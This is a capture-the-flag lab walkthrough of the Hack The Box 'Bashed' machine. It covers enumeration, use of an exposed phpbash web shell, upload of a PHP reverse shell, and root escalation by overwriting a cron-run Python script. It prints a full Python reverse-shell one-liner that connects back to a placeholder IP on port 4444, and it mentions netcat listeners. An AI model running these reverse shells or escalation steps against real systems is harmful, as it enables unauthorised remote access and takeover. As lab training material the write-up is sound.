BASHED -HTB Writeup
Type:Linux

IP: 10.10.10.68

![image](https://user-images.githubusercontent.com/71508714/169670416-d2d805a0-292b-4848-8aeb-1c57a06add2f.png)

Bashed is a fairly straightforward box. Let’s start the walkthrough with basic enumeration!

Nmap scan :

![image](https://user-images.githubusercontent.com/71508714/169670434-a0976c0a-5a04-4f90-9824-7c5db1ca482e.png)

Let’s now head over to http://10.10.10.68 (port 80 by default).

![image](https://user-images.githubusercontent.com/71508714/169670445-f2cf472a-86d6-441e-8cdf-0f01bcbf1a75.png)

Nothing found in this page after viewing source code & other details. Click on the arrow .

![image](https://user-images.githubusercontent.com/71508714/169670451-7d8289b7-38e1-400f-92d7-22e9f8dce524.png)

Click on https://github.com/Arrexel/phpbash — You will get all the information.

https://blog.sucuri.net/2020/09/phpbash-terminal-editor-web-shell.html — You can also visit this blog for better understanding.

Do a directory search as in sc shot the directory was not get opened as mentioned in the url https://github.com/Arrexel/phpbash.

10.10.10.68/uploads/phpbash.php — not worked.

![image](https://user-images.githubusercontent.com/71508714/169670467-b1b6ea66-a8e9-4870-b350-73ca8e3857af.png)

Do a Directory search using dirbuster.

![image](https://user-images.githubusercontent.com/71508714/169670475-46977fae-f47e-4fbf-8b23-e654e97be03b.png)

Tried 10.10.10.68/sendMail.php but not worked again

js files not much important for this time.

Looking in /dev/, we find phpbash.php and phpbash.min.php.

Info: The /dev directory contains the special device files for all the devices. The device files are created during installation, and later with the /dev/MAKEDEV script.

![image](https://user-images.githubusercontent.com/71508714/169670491-84796b56-4321-4e78-8e53-d1ce59ab5da5.png)


Click on any one of the .php files, and we get a very convenient shell as www-data.

![image](https://user-images.githubusercontent.com/71508714/169670500-3ae7816e-c75c-4b11-96ef-223ec187701c.png)


Do a cat /etc/passwd — you can see the user & other details.

cd /home/arrexel & see there are two user: arrexel & scriptmanager

![image](https://user-images.githubusercontent.com/71508714/169670502-8211ecca-5443-4f58-b8d7-5133d6644075.png)


1st flag is found. Now look for next flag root flag.

Check put permission by sudo -l

![image](https://user-images.githubusercontent.com/71508714/169670512-3969e663-4afc-41c6-bd2b-83266aba02c6.png)


As we can change into another user scriptmanager with no password.

![image](https://user-images.githubusercontent.com/71508714/169670522-e09f6466-3584-4132-946f-2486628f44b0.png)


As previously we have do upload & get a shell & listen through netcat but this time no tab or section for this but we have directory uploads & check it once .Nothing there. if we can upload any malicious file to this apache shell our half of the work can be completed as we have already access to www-data . So lets check the folder of any web server /var/www/html/uploads.Tried curl not worked then tried wget its worked.

INFO: https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php — only change the ip & the port you want to listen

![image](https://user-images.githubusercontent.com/71508714/169670528-28236647-50f1-4721-a3db-b3592ec9c1fb.png)


![image](https://user-images.githubusercontent.com/71508714/169670530-256e3c15-07ea-45c7-ab96-a92b9c215ca8.png)


Check out the file & listen through netcat

![image](https://user-images.githubusercontent.com/71508714/169670538-19a15177-7b6c-49d8-ab88-b4f90277951c.png)

As tty is not present .So try to upgrade shell

![image](https://user-images.githubusercontent.com/71508714/169670548-4d36c79a-a475-4dc1-b7be-37920da4639a.png)

after upgrading login as scriptmanager and see there is a script folder. Try to explore.

![image](https://user-images.githubusercontent.com/71508714/169670563-ccee68fc-90d6-440c-b453-16af3ca5fa3d.png)


it has two file test.py & test.txt . Interesting part is that test.txt is owned by root user.

![image](https://user-images.githubusercontent.com/71508714/169670574-1004a6ec-3b50-48c5-bc4f-7e25e990d2b8.png)

Check the timing of test.txt ruuning on interval. Means some cron job is running .

![image](https://user-images.githubusercontent.com/71508714/169670583-2cbd508e-e231-45a1-ad24-30695832cfe0.png)


As test.py have test.txt which means when its runs a test.txt file is created & owned by root. So some if we can run our own test.py then we can be the root as only output file is owned by root .

Info: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet — you can try any reverse shell but i will go for python:

python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’> — save this file & download this file. Enter the your ip & port.

![image](https://user-images.githubusercontent.com/71508714/169670589-47139483-64dc-425d-8979-1e0e8e85617a.png)

![image](https://user-images.githubusercontent.com/71508714/169670593-127da2c8-ee70-41cd-b032-793a5f710d5a.png)

Name the file same as test.py & start netcat to listen.
![image](https://user-images.githubusercontent.com/71508714/169670599-0968447d-c8fa-4bba-9bea-842cb0ed4a7d.png)

& now you are the root. Ignore the nc -lnvp 4444 after root.

cat /root/root.txt — and find the flag.

Learning:

SimpleHttpServer in depth.
Dev folder .
More Knowledge about privilege escalation
Some tricky part at scripts.

